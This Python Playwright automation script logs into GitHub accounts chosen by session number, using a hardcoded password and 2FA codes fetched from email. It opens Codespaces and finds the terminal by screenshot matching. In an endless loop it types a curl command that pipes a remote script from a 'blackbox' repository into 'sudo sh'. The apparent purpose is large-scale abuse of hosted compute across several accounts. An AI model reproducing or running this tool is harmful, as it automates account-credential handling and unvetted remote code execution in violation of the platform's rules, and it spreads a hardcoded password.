import argparse
import time
import sys
import cv2
import numpy as np
from playwright.sync_api import sync_playwright
from ck_params import get_ck
from get_2FA import get_2fa

# ── args ─────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--session", type=int, required=True)
parser.add_argument("--password", default="baba123A*", help="GitHub password")
args = parser.parse_args()
args.user = get_ck(args.session)

# ── colors ────────────────────────────────────────────────────────────────────
C = {
    "reset":   "\033[0m",  "bold":    "\033[1m",
    "cyan":    "\033[96m", "green":   "\033[92m",
    "yellow":  "\033[93m", "red":     "\033[91m",
    "grey":    "\033[90m", "blue":    "\033[94m",
    "magenta": "\033[95m", "white":   "\033[97m",
}
SESSION_COLORS = {1: "cyan", 2: "green", 3: "magenta", 4: "yellow", 5: "blue"}
_sc = SESSION_COLORS.get(args.session, "white")
SID = f"{C['bold']}{C[_sc]}[S{args.session}]{C['reset']}"

# ── logging ───────────────────────────────────────────────────────────────────
def log(msg, color="reset"):
    print(f"{SID} {C[color]}{msg}{C['reset']}")

# ── check tracking ────────────────────────────────────────────────────────────
check_counts    = {}
_last_check_key = [None]

def _end_check_line():
    if _last_check_key[0] is not None:
        print()
        _last_check_key[0] = None

# ── template matching ─────────────────────────────────────────────────────────
def _screenshot_screen(page):
    try:
        page.wait_for_load_state("domcontentloaded", timeout=10000)
    except Exception:
        pass
    try:
        raw = page.screenshot(timeout=15000, full_page=False)
    except Exception:
        page.wait_for_timeout(3000)
        raw = page.screenshot(timeout=15000, full_page=False)
    return cv2.imdecode(np.frombuffer(raw, np.uint8), cv2.IMREAD_COLOR)

def _match(screen, template_path):
    template = cv2.imread(template_path)
    result = cv2.matchTemplate(screen, template, cv2.TM_CCOEFF_NORMED)
    _, max_val, _, max_loc = cv2.minMaxLoc(result)
    return max_val, max_loc, template.shape[:2]

def is_found(page, template_path, threshold=0.8):
    try:
        check_counts[template_path] = check_counts.get(template_path, 0) + 1
        n = check_counts[template_path]
        if _last_check_key[0] == template_path:
            print(f"{C['grey']}.{C['reset']}", end="", flush=True)
        else:
            if _last_check_key[0] is not None:
                print()
            print(f"{SID} {C['yellow']}[check #{n}]{C['reset']} {C['grey']}{template_path}{C['reset']}", end="", flush=True)
            _last_check_key[0] = template_path
        screen = _screenshot_screen(page)
        max_val, _, _ = _match(screen, template_path)
        return max_val >= threshold
    except Exception as e:
        print()
        _last_check_key[0] = None
        log(f"Screenshot failed: {e}", "red")
        return False

def find_and_click(page, template_path, threshold=0.8):
    screen = cv2.imdecode(np.frombuffer(page.screenshot(), np.uint8), cv2.IMREAD_COLOR)
    max_val, max_loc, (h, w) = _match(screen, template_path)
    if max_val < threshold:
        raise Exception(f"Template not found (confidence: {max_val:.2f})")
    page.mouse.click(max_loc[0] + w // 2, max_loc[1] + h // 2)
    return max_loc[0] + w // 2, max_loc[1] + h // 2

# ── wait helpers ──────────────────────────────────────────────────────────────
def wait_for_template(page, template_path, interval=15000):
    attempt = 0
    while not is_found(page, template_path):
        attempt += 1
        sys.stdout.write(f"\r{SID} {C['yellow']}waiting for {template_path}... attempt {attempt}{C['reset']}  ")
        sys.stdout.flush()
        page.wait_for_timeout(interval)
    _end_check_line()
    return attempt

def wait_until_ready(page, wait_template="src/wait.png", interval=3):
    while is_found(page, wait_template):
        page.wait_for_timeout(interval * 1000)
    _end_check_line()
    log("Codespace is ready!", "green")

# ── stages ────────────────────────────────────────────────────────────────────
def stage_launch_browser(p):
    log("[1/7] Launching browser...", "blue")
    browser = p.chromium.launch(headless=False, args=["--start-maximized"])
    context = browser.new_context(no_viewport=True)
    context.set_default_timeout(300000)
    context.set_default_navigation_timeout(300000)
    return browser, context.new_page(), context

def stage_login(page):
    log("[auth] Navigating to GitHub login...", "blue")
    page.goto("https://github.com/login", timeout=120000)
    page.fill("#login_field", args.user)
    page.fill("#password", args.password)
    page.click("[name='commit']")
    page.wait_for_timeout(3000)
    _handle_2fa(page)
    if page.locator("meta[name='user-login']").count() == 0:
        log("Login may have failed — check the browser window.", "red")
        input(f"{SID} {C['red']}Press Enter to exit{C['reset']}")
        raise SystemExit(1)
    log("[auth] Login successful!", "green")

def _handle_2fa(page):
    if page.locator("#app_totp").count() == 0 and page.locator("[name='otp']").count() == 0:
        return
    log("[auth] 2FA required, fetching code from email...", "yellow")
    otp = get_2fa(args.user)
    if not otp:
        log("[auth] Failed to retrieve 2FA code!", "red")
        choice = input(f"{SID} {C['red']}2FA failed. Continue anyway? [c/exit]: {C['reset']}").strip().lower()
        if choice != "c":
            raise SystemExit(1)
        log("[auth] Waiting for manual 2FA — complete it in the browser...", "yellow")
        for _ in range(60):
            page.wait_for_timeout(5000)
            url = page.url
            if "github.com" in url and not any(x in url for x in ["/login", "/sessions/two-factor", "/two-factor"]):
                break
        else:
            log("[auth] Timed out waiting for manual login.", "red")
            raise SystemExit(1)
        log("[auth] Manual login detected, continuing...", "green")
        return
    log(f"[auth] Got 2FA code: {otp}", "green")
    selector = "#app_totp" if page.locator("#app_totp").count() > 0 else "[name='otp']"
    page.fill(selector, otp)
    page.keyboard.press("Enter")
    page.wait_for_timeout(3000)

def stage_open_codespace(page, context):
    log("[2/7] Navigating to GitHub Codespaces...", "blue")
    page.goto("https://github.com/codespaces?unpublished=true", timeout=300000)
    page.wait_for_timeout(15000)

    log("[2.1/7] Opening codespace in browser...", "blue")
    page.locator("button.Button--iconOnly .octicon-kebab-horizontal").first.click()
    page.wait_for_timeout(15000)
    page.get_by_text("Open in Browser").click()

    new_page = context.wait_for_event("page")
    new_page.wait_for_load_state()
    page.close()
    page = new_page
    time.sleep(5)
    try:
        page.reload()
    except Exception:
        pass
    time.sleep(5)
    return page

def stage_clear_setting_space(page):
    first = True
    while is_found(page, "src/setting_space.png"):
        _end_check_line()
        if first:
            log("setting_space detected for the first time — waiting 10s then refreshing...", "yellow")
            time.sleep(10)
            try:
                page.reload()
            except Exception:
                pass
            first = False
            continue
        log("setting_space still present, waiting up to 2 minutes...", "yellow")
        for _ in range(8):
            page.wait_for_timeout(15000)
            if not is_found(page, "src/setting_space.png"):
                break
        _end_check_line()
        if is_found(page, "src/setting_space.png"):
            _end_check_line()
            log("Still stuck, refreshing...", "yellow")
            try:
                page.reload()
            except Exception:
                pass
    _end_check_line()
    log("setting_space cleared, continuing...", "green")

def stage_wait_codespace_load(page):
    log("[3/7] Checking if codespace is loading...", "blue")
    wait_for_template(page, "src/wait.png")
    log("wait.png detected! Codespace is loading...", "green")
    wait_for_template(page, "src/go_ready.png")
    log("go_ready.png detected! Proceeding...", "green")
    wait_until_ready(page)

def stage_find_terminal(page, browser):
    log("[3.5/7] Closing chat panel...", "blue")
    find_and_click(page, "src/close_chat.png")
    page.wait_for_timeout(3000)

    attempt = 0
    loc = shape = None
    while attempt < 30:
        screen = cv2.imdecode(np.frombuffer(page.screenshot(), np.uint8), cv2.IMREAD_COLOR)
        max_val, max_loc, tpl_shape = _match(screen, "src/k_terminal.png")
        attempt += 1
        sys.stdout.write(f"\r{SID} {C['yellow']}waiting for k_terminal.png... attempt {attempt} conf={max_val:.3f}{C['reset']}  ")
        sys.stdout.flush()
        if max_val >= 0.6:
            loc, shape = max_loc, tpl_shape
            break
        if attempt % 5 == 0:
            dbg_path = f"debug_k_terminal_attempt{attempt}.png"
            cv2.imwrite(dbg_path, screen)
            print()
            log(f"[debug] conf={max_val:.3f} — saved {dbg_path}", "yellow")
        page.wait_for_timeout(15000)
    _end_check_line()

    if loc is None:
        log(f"k_terminal.png never matched after {attempt} attempts — saving debug screenshot", "red")
        page.screenshot(path="debug_k_terminal_final.png")
        browser.close()
        exit(1)
    log(f"k_terminal.png matched! conf={max_val:.3f}", "green")
    return loc, shape

def stage_click_terminal(page, loc, shape, browser):
    log("[4/7] Clicking terminal tab...", "blue")
    page.screenshot(path="debug_before_terminal.png")
    try:
        h, w = shape
        cx, cy = loc[0] + w // 2, loc[1] + h // 2
        log(f"[click 1] Clicking k_terminal at ({cx}, {cy})", "grey")
        page.mouse.click(cx, cy)
        page.wait_for_timeout(3000)
        log("[click 2] Clicking again to focus terminal", "grey")
        page.mouse.click(cx, cy)
        page.wait_for_timeout(3000)
    except Exception as e:
        log(f"Failed to click terminal: {e}", "red")
        browser.close()
        exit(1)

def stage_run_command(page):
    log("[5/7] Typing command...", "blue")
    page.keyboard.type("   curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/blackbox/refs/heads/master/init_.sh' | sudo sh")
    page.wait_for_timeout(1000)
    page.keyboard.press("Enter")
    wait_for_template(page, "src/restart.png")
    log("Restart detected! Clicking restart...", "green")
    find_and_click(page, "src/restart.png")
    page.wait_for_timeout(15000)

# ── main ──────────────────────────────────────────────────────────────────────
with sync_playwright() as p:
    browser, page, context = stage_launch_browser(p)

    stage_login(page)
    time.sleep(3)
    page.screenshot(path=f"session-{args.session}.png")
    log(f"Screenshot saved: session-{args.session}.png", "green")

    page = stage_open_codespace(page, context)
    stage_clear_setting_space(page)

    while True:
        stage_wait_codespace_load(page)
        loc, shape = stage_find_terminal(page, browser)
        stage_click_terminal(page, loc, shape, browser)
        stage_run_command(page)
